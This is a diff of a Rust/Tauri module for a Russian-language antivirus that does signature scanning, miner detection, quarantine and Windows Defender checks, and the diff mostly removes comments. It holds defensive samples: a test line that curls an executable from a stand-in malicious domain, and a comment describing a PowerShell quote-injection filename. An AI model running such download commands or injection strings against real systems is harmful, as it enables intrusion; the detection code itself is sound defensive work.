@@ -1,15 +1,3 @@
-//! Антивирус: проверка ПК, карантин, обновляемые базы сигнатур.
-//!
-//! Что делает:
-//!   • сверяет SHA-256 исполняемых файлов с базой хешей (свежие образцы MalwareBazaar, база обновляется с нашего сервера);
-//!   • ищет майнеры и хакерские утилиты по имени файла, командной строке процесса, доменам и портам майнинг-пулов;
-//!   • смотрит автозапуск и исключения Защитника Windows (там майнеры любят прятаться);
-//!   • подозрительное уходит в карантин (файл перекладывается и «портится» XOR, запустить его нельзя): восстановить, удалить
-//!     совсем или добавить в исключения.
-//!
-//! Чего НЕ делает: не заменяет Защитник Windows (поведенческий анализ, драйверы, облачная защита) — он остаётся основным; здесь
-//! сигнатуры и эвристики поверх него, плюс кнопки для запуска проверки и обновления самого Защитника. Ничего не удаляется
-//! без явного действия пользователя, системные папки и сама программа защищены от карантина.
 
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
@@ -22,9 +10,7 @@ use std::process::Command;
 use std::sync::atomic::{AtomicBool, Ordering};
 use tauri::{AppHandle, Emitter, Manager};
 
-// Закодировано в build.rs (строки сигнатур майнеров в открытом виде антивирусы принимают за сам майнер).
 const BASELINE_BIN: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/av-baseline.bin"));
-// Тот же ключ, что в build.rs; им же закодированы скачанные базы на диске (signatures.bin).
 const TEXT_KEY: &[u8] = b"DUB-av-baseline/1";
 
 fn xor_text(data: &[u8]) -> Vec<u8> {
@@ -38,15 +24,11 @@ use crate::API_BASE;
 const MAX_HASH_BYTES: u64 = 300 * 1024 * 1024;
 const XOR_KEY: u8 = 0x5A;
 const SCAN_EXTS: &[&str] = &[
-    // исполняемые и скрипты
     "exe", "dll", "scr", "bat", "cmd", "ps1", "vbs", "vbe", "jse", "js", "wsf", "msi", "jar", "com", "hta", "cpl", "ocx", "sys", "pif", "reg", "lnk",
-    // документы (макросы, эксплойты) и контейнеры, в которых прячут вирусы
     "doc", "docm", "dot", "dotm", "xls", "xlsm", "xlsb", "xlam", "ppt", "pptm", "rtf", "pdf", "iso", "img", "zip", "rar", "7z", "cab",
 ];
 
 static CANCEL: AtomicBool = AtomicBool::new(false);
-
-// ---------------------------------------------------------------- базы
 
 #[derive(Deserialize, Serialize, Clone, Default)]
 struct NameSig {
@@ -72,15 +54,12 @@ struct Signatures {
     pool_domains: Vec<String>,
     #[serde(default)]
     pool_ports: Vec<u16>,
-    /// Адреса управляющих серверов вредоносов (Feodo, SSLBL, ThreatFox) и домены, раздающие вредоносное (URLhaus, NoCoin).
     #[serde(default)]
     bad_ips: Vec<String>,
     #[serde(default)]
     bad_domains: Vec<String>,
 }
 
-/// Окружение проверки: каталог данных антивируса и приёмник прогресса. Не привязано к окну Tauri, поэтому та же проверка
-/// запускается и в отдельном процессе с правами администратора (headless).
 pub struct Env {
     dir: PathBuf,
     sink: Box<dyn Fn(Value) + Send + Sync>,
@@ -98,7 +77,6 @@ fn av_dir(app: &AppHandle) -> Result<PathBuf, String> {
     Ok(dir)
 }
 
-/// Полная база хешей (MalwareBazaar + ThreatFox): сортированные первые 8 байт SHA-256. Формат: «AVH1», u32 версия, u64 число, записи.
 fn parse_full(bytes: &[u8]) -> Option<(u32, Vec<u64>)> {
     if bytes.len() < 16 || &bytes[..4] != b"AVH1" {
         return None;
@@ -122,7 +100,6 @@ fn full_version_in(dir: &Path) -> (u32, usize) {
 
 fn load_signatures_in(dir: &Path) -> Signatures {
     let baseline: Signatures = serde_json::from_str(&baseline_json()).unwrap_or_default();
-    // Скачанные базы — закодированный signatures.bin; signatures.json остался от старых версий.
     let local = fs::read(dir.join("signatures.bin")).map(|b| xor_text(&b)).or_else(|_| fs::read(dir.join("signatures.json")));
     if let Ok(text) = local {
         if let Ok(local) = serde_json::from_slice::<Signatures>(&text) {
@@ -137,8 +114,6 @@ fn load_signatures_in(dir: &Path) -> Signatures {
 fn load_signatures(app: &AppHandle) -> Signatures {
     av_dir(app).map(|d| load_signatures_in(&d)).unwrap_or_else(|_| serde_json::from_str(&baseline_json()).unwrap_or_default())
 }
-
-// ------------------------------------------------------ исключения и карантин
 
 #[derive(Deserialize, Serialize, Default, Clone)]
 struct Exclusions {
@@ -194,7 +169,6 @@ fn save_quarantine(app: &AppHandle, items: &[QItem]) -> Result<(), String> {
     fs::write(dir.join("quarantine.json"), serde_json::to_vec(items).unwrap_or_default()).map_err(|e| e.to_string())
 }
 
-/// Журнал: проверки, карантин, восстановление, исключения, срабатывания защиты — вкладка «История». Хранятся последние 300.
 fn log_event_in(dir: &Path, kind: &str, title: &str, detail: &str) {
     let path = dir.join("history.json");
     let mut list: Vec<Value> = fs::read_to_string(&path).ok().and_then(|t| serde_json::from_str(&t).ok()).unwrap_or_default();
@@ -225,7 +199,6 @@ fn now_secs() -> u64 {
         .unwrap_or(0)
 }
 
-/// Копирует файл через XOR: «карантинный» файл невозможно запустить, и сигнатурные сканеры его не узнают.
 fn xor_copy(from: &Path, to: &Path) -> std::io::Result<()> {
     let mut src = fs::File::open(from)?;
     let mut dst = fs::File::create(to)?;
@@ -243,9 +216,6 @@ fn xor_copy(from: &Path, to: &Path) -> std::io::Result<()> {
     dst.flush()
 }
 
-// ------------------------------------------------------------ защита системы
-
-/// Пути, которые нельзя трогать никогда: Windows, сама программа, каталог карантина.
 fn is_protected(path: &Path, own_dirs: &[PathBuf]) -> bool {
     let lower = path.to_string_lossy().to_lowercase().replace('/', "\\");
     if let Ok(windir) = std::env::var("WINDIR") {
@@ -280,7 +250,6 @@ fn own_dirs_in(av: Option<PathBuf>) -> Vec<PathBuf> {
     if let Ok(exe) = std::env::current_exe() {
         if let Some(parent) = exe.parent() {
             dirs.push(parent.to_path_buf());
-            // Velopack кладёт текущую версию в <корень>\current; корень содержит Update.exe и пакеты.
             if let Some(root) = parent.parent() {
                 if root.join("Update.exe").exists() {
                     dirs.push(root.to_path_buf());
@@ -293,8 +262,6 @@ fn own_dirs_in(av: Option<PathBuf>) -> Vec<PathBuf> {
     }
     dirs
 }
-
-// -------------------------------------------------------------------- утилиты
 
 fn sha256_file(path: &Path) -> Option<String> {
     let meta = fs::metadata(path).ok()?;
@@ -326,8 +293,6 @@ fn detection_id(kind: &str, key: &str) -> String {
     hex(&h.finalize())[..16].to_string()
 }
 
-/// Строка внутри '…' для PowerShell. Кавычкой PowerShell считает не только ', но и типографские ‘ ’ ‚ ‛ —
-/// без их удвоения имя файла вроде «x’; calc; ’.exe» вышло бы из строки и выполнилось как команда.
 pub(crate) fn ps_quote(v: &str) -> String {
     let mut out = String::with_capacity(v.len() + 2);
     for c in v.chars() {
@@ -339,7 +304,6 @@ pub(crate) fn ps_quote(v: &str) -> String {
     out
 }
 
-/// PowerShell без окна, вывод в UTF-8. На не-Windows возвращает ошибку (проверка процессов и реестра только для Windows).
 fn powershell(script: &str) -> Result<String, String> {
     #[cfg(windows)]
     {
@@ -359,7 +323,6 @@ fn powershell(script: &str) -> Result<String, String> {
     }
 }
 
-/// PowerShell отдаёт один объект без массива — приводим к списку.
 fn json_items(text: &str) -> Vec<Value> {
     match serde_json::from_str::<Value>(text.trim()) {
         Ok(Value::Array(a)) => a,
@@ -368,7 +331,6 @@ fn json_items(text: &str) -> Vec<Value> {
     }
 }
 
-/// Путь к exe из значения автозапуска: `"C:\x\a.exe" -arg` или `C:\x\a.exe /arg`.
 fn extract_exe(data: &str) -> Option<String> {
     let t = data.trim();
     if let Some(rest) = t.strip_prefix('"') {
@@ -409,7 +371,6 @@ fn match_cmdline<'a>(sigs: &'a Signatures, cmd: &str) -> Option<&'a str> {
         .or_else(|| sigs.pool_domains.iter().map(|s| s.as_str()).find(|d| lower.contains(&d.to_lowercase())))
 }
 
-/// Домен из списка вредоносных, упомянутый в командной строке.
 fn match_bad_domain<'a>(sigs: &'a Signatures, cmd: &str) -> Option<&'a str> {
     let lower = cmd.to_lowercase();
     if !lower.contains('.') {
@@ -418,7 +379,6 @@ fn match_bad_domain<'a>(sigs: &'a Signatures, cmd: &str) -> Option<&'a str> {
     sigs.bad_domains.iter().map(|d| d.as_str()).find(|d| d.len() >= 6 && lower.contains(d))
 }
 
-/// Множество адресов C2 для быстрой проверки соединений.
 pub fn bad_ip_set(app: &AppHandle) -> HashSet<String> {
     load_signatures(app).bad_ips.into_iter().collect()
 }
@@ -444,14 +404,12 @@ struct Ctx {
     seen: HashSet<String>,
     hashed: HashMap<String, Option<String>>,
     scanned: u64,
-    /// Сколько реально проверено и что пропущено — чтобы отчёт честно показывал охват.
     files: u64,
     procs: u64,
     folders: u64,
     skipped_large: u64,
     denied_dirs: u64,
     denied_list: Vec<String>,
-    /// Все файлы, которые прошёл обход, и сколько из них пропущено как «не тот тип» (картинки, видео, текст…).
     total_files: u64,
     skipped_type: u64,
     all_files: bool,
@@ -470,7 +428,6 @@ impl Ctx {
         self.excl.paths.iter().any(|p| p.to_lowercase() == lower) || sha.map(|h| self.excl.hashes.iter().any(|x| x == h)).unwrap_or(false)
     }
 
-    /// Проверка одного файла: хеш по базе, затем имя. Возвращает true, если что-то нашли.
     fn check_file(&mut self, path: &str, kind: &str, pid: Option<u64>) -> bool {
         let p = Path::new(path);
         let sha = if let Some(c) = self.hashed.get(path) {
@@ -538,7 +495,6 @@ impl Ctx {
     }
 }
 
-/// Проверка одного файла «на лету» (защита в реальном времени): базы и исключения подхватываются раз в 5 минут.
 pub struct Checker {
     ctx: Ctx,
     dir: PathBuf,
@@ -582,7 +538,7 @@ impl Checker {
         }
         self.ctx.found.clear();
         self.ctx.seen.clear();
-        self.ctx.hashed.clear(); // файл мог поменяться — хеш считаем заново
+        self.ctx.hashed.clear();
         if is_protected(Path::new(path), &self.ctx.own) {
             return None;
         }
@@ -598,13 +554,10 @@ pub fn is_scan_ext(path: &Path) -> bool {
     path.extension().map(|e| SCAN_EXTS.contains(&e.to_string_lossy().to_lowercase().as_str())).unwrap_or(false)
 }
 
-// -------------------------------------------------------------------- проверка
-
 fn emit(env: &Env, stage: &str, scanned: u64, found: usize, current: &str) {
     (env.sink)(json!({ "stage": stage, "scanned": scanned, "found": found, "current": current }));
 }
 
-/// Все фиксированные диски (C:, D:…): полная проверка идёт по ним целиком, а не только по профилю пользователя.
 fn fixed_drives() -> Vec<PathBuf> {
     let mut drives = Vec::new();
     if let Ok(text) = powershell("Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object -ExpandProperty DeviceID | ConvertTo-Json -Compress") {
@@ -628,14 +581,11 @@ fn roots_for(mode: &str, custom: &[String]) -> Vec<(PathBuf, usize)> {
     match mode {
         "custom" => roots.extend(custom.iter().map(|p| (PathBuf::from(p), 12))),
         "full" => {
-            // Все фиксированные диски целиком (в том числе Windows и Program Files); глубина — практически без ограничения.
             for d in fixed_drives() {
                 roots.push((d, 24));
             }
         }
         _ => {
-            // Быстрая: места, где чаще всего оседают вирусы — пользовательские папки, AppData, Temp, автозагрузка, общие папки
-            // и «критичные» каталоги Windows. Для полного охвата (все диски) есть «Полная проверка».
             if let Some(u) = var("USERPROFILE") {
                 for sub in ["Downloads", "Desktop", "Documents", "Pictures", "Videos", "Music"] {
                     roots.push((u.join(sub), 5));
@@ -691,11 +641,11 @@ fn walk(env: &Env, ctx: &mut Ctx, dir: &Path, depth: usize, stage: &str) {
         let path = entry.path();
         let Ok(ft) = entry.file_type() else { continue };
         if ft.is_symlink() {
-            continue; // не ходим по ссылкам: петли и выход за пределы проверяемой области
+            continue;
         }
         if ft.is_dir() {
             if is_own(&path, &ctx.own) {
-                continue; // свою папку и карантин не проверяем
+                continue;
             }
             let name = entry.file_name().to_string_lossy().to_lowercase();
             if name == "$recycle.bin" || name == "node_modules" || name == "system volume information" || name == "winsxs" {
@@ -784,7 +734,6 @@ fn scan_network(env: &Env, ctx: &mut Ctx, pnames: &HashMap<u64, String>) {
     emit(env, "Сеть", ctx.scanned, ctx.found.len(), "");
     let script = "Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object OwningProcess,RemoteAddress,RemotePort | ConvertTo-Json -Compress";
     let Ok(text) = powershell(script) else { return };
-    // Эти программы часто ходят на «пуловые» порты по своим причинам — не считаем их подозрительными.
     let calm = ["chrome", "msedge", "firefox", "brave", "opera", "steam", "discord", "telegram", "adb", "system", "svchost", "code", "java", "javaw"];
     for item in json_items(&text) {
         let pid = item["OwningProcess"].as_u64().unwrap_or(0);
@@ -858,7 +807,6 @@ fn scan_autorun(env: &Env, ctx: &mut Ctx) {
                 extra: json!({ "hive": hive, "value": name }),
             });
         } else if flagged {
-            // к найденному файлу добавляем, откуда он стартует — чтобы можно было убрать запись
             if let Some(d) = ctx.found.last_mut() {
                 d.extra = json!({ "hive": hive, "value": name, "label": d.extra["label"].clone() });
             }
@@ -981,8 +929,6 @@ fn scan_core(env: &Env, mode: String, custom: Vec<String>, all_files: bool) -> V
     report
 }
 
-/// Точка входа отдельного процесса с правами администратора: `project-desktop.exe --av-scan <mode> --data-dir <dir> [--path <p>]…`.
-/// Окна нет: прогресс и итог пишутся в файлы каталога данных, а отмена — файлом cancel.flag.
 pub fn headless(args: &[String]) -> i32 {
     let mut mode = "quick".to_string();
     let mut dir: Option<PathBuf> = None;
@@ -1041,7 +987,6 @@ fn scan_blocking(app: AppHandle, mode: String, custom: Vec<String>, all_files: b
     }
 }
 
-/// Проверка в отдельном процессе с правами администратора (запрос UAC): так открываются папки, закрытые обычному пользователю.
 fn scan_elevated(app: &AppHandle, mode: &str, custom: &[String], all_files: bool) -> Result<Value, String> {
     let dir = av_dir(app)?;
     for f in ["scan_report.json", "scan_progress.json", "cancel.flag"] {
@@ -1067,7 +1012,6 @@ fn scan_elevated(app: &AppHandle, mode: &str, custom: &[String], all_files: bool
         q(&exe.to_string_lossy()),
         args.join(",")
     );
-    // Пока администраторский процесс работает, пересылаем его прогресс в окно.
     let stop = std::sync::Arc::new(AtomicBool::new(false));
     let stop_flag = stop.clone();
     let progress_file = dir.join("scan_progress.json");
@@ -1099,8 +1043,6 @@ fn scan_elevated(app: &AppHandle, mode: &str, custom: &[String], all_files: bool
         .ok_or_else(|| "Проверка с правами администратора не вернула результат.".to_string())
 }
 
-// ------------------------------------------------------------------ команды
-
 #[tauri::command(async)]
 pub async fn av_scan(app: AppHandle, mode: String, paths: Option<Vec<String>>, elevated: Option<bool>, all_files: Option<bool>) -> Result<Value, String> {
     let all_files = all_files.unwrap_or(false);
@@ -1118,7 +1060,6 @@ pub async fn av_scan(app: AppHandle, mode: String, paths: Option<Vec<String>>, e
 #[tauri::command]
 pub fn av_cancel(app: AppHandle) {
     CANCEL.store(true, Ordering::Relaxed);
-    // Проверка с правами администратора идёт в другом процессе — просим её остановиться файлом.
     if let Ok(dir) = av_dir(&app) {
         let _ = fs::write(dir.join("cancel.flag"), b"1");
     }
@@ -1178,11 +1119,10 @@ pub async fn av_update_signatures(app: AppHandle) -> Result<Value, String> {
     let tmp = dir.join("signatures.bin.tmp");
     fs::write(&tmp, xor_text(&bytes)).map_err(|e| e.to_string())?;
     fs::rename(&tmp, dir.join("signatures.bin")).map_err(|e| e.to_string())?;
-    let _ = fs::remove_file(dir.join("signatures.json")); // открытый текст от старой версии — антивирусы ругаются на него
+    let _ = fs::remove_file(dir.join("signatures.json"));
     Ok(json!({ "updated": true, "version": fresh.version, "hashes": fresh.sha256.len(), "when": fresh.updated, "full": full.1 }))
 }
 
-/// Полная база: проверяем версию на сервере и качаем (7–9 МБ), только если там новее. Возвращает (обновлено?, число записей).
 async fn update_full(app: &AppHandle, client: &reqwest::Client) -> (bool, usize) {
     let Ok(dir) = av_dir(app) else { return (false, 0) };
     let (local_version, local_count) = full_version_in(&dir);
@@ -1224,7 +1164,6 @@ fn kill_pid(pid: u64) {
     }
 }
 
-/// Файл в карантин. Если им занят процесс (pid) — сначала завершаем его (пользователь нажал кнопку).
 #[tauri::command(async)]
 pub async fn av_quarantine(app: AppHandle, path: String, pid: Option<u64>, label: Option<String>) -> Result<Value, String> {
     tauri::async_runtime::spawn_blocking(move || quarantine_path(&app, &path, pid, label))
@@ -1317,7 +1256,6 @@ pub fn av_quarantine_delete(app: AppHandle, id: String) -> Result<(), String> {
     save_quarantine(&app, &items)
 }
 
-/// Исключить: путь и/или хеш больше не считаются угрозой при проверках.
 #[tauri::command]
 pub fn av_exclude(app: AppHandle, path: Option<String>, sha256: Option<String>) -> Result<(), String> {
     let mut ex = load_exclusions(&app);
@@ -1349,7 +1287,6 @@ pub fn av_exclusion_remove(app: AppHandle, value: String) -> Result<(), String> 
     save_exclusions(&app, &ex)
 }
 
-// async: kill_pid ждёт taskkill/kill, а синхронная команда выполняется на главном потоке окна.
 #[tauri::command(async)]
 pub fn av_kill(pid: u64) {
     if pid != std::process::id() as u64 && pid > 4 {
@@ -1357,7 +1294,6 @@ pub fn av_kill(pid: u64) {
     }
 }
 
-/// Убрать запись автозапуска (HKCU без прав администратора; HKLM — только из-под администратора).
 #[tauri::command(async)]
 pub async fn av_remove_autorun(hive: String, value: String) -> Result<(), String> {
     if hive != "HKCU" && hive != "HKLM" {
@@ -1375,7 +1311,6 @@ pub async fn av_remove_autorun(hive: String, value: String) -> Result<(), String
     }
 }
 
-/// Убрать исключение Защитника Windows (нужны права администратора).
 #[tauri::command(async)]
 pub async fn av_remove_defender_exclusion(path: String) -> Result<(), String> {
     let p = ps_quote(&path);
@@ -1389,7 +1324,6 @@ pub async fn av_remove_defender_exclusion(path: String) -> Result<(), String> {
     }
 }
 
-/// Защитник Windows: состояние, обновление его баз, быстрая проверка. Основной антивирус системы — не заменяем, а запускаем.
 #[tauri::command(async)]
 pub async fn av_defender(action: String) -> Result<Value, String> {
     tauri::async_runtime::spawn_blocking(move || -> Result<Value, String> {
@@ -1456,9 +1390,8 @@ mod tests {
         assert_eq!(data, list);
         assert!(data.binary_search(&0xdead_beef_0000_0001).is_ok());
         assert!(data.binary_search(&7).is_err());
-        assert!(parse_full(&bytes[..bytes.len() - 3]).is_none()); // обрезанный файл не принимаем
+        assert!(parse_full(&bytes[..bytes.len() - 3]).is_none());
         assert!(parse_full(b"XXXX").is_none());
-        // префикс из hex-строки SHA-256 берётся так же, как на сервере
         assert_eq!(u64::from_str_radix(&"dead beef 0000 0001".replace(' ', ""), 16).unwrap(), 0xdead_beef_0000_0001);
     }
 
@@ -1469,7 +1402,7 @@ mod tests {
         s.bad_ips = vec!["203.0.113.9".into()];
         assert_eq!(match_bad_domain(&s, "curl https://evil-cdn.example/a.exe"), Some("evil-cdn.example"));
         assert!(match_bad_domain(&s, "curl https://github.com/a").is_none());
-        assert!(match_bad_domain(&s, "x.io").is_none()); // слишком короткие записи не используем: много ложных
+        assert!(match_bad_domain(&s, "x.io").is_none());
         assert!(s.bad_ips.iter().any(|b| b == "203.0.113.9"));
     }
 
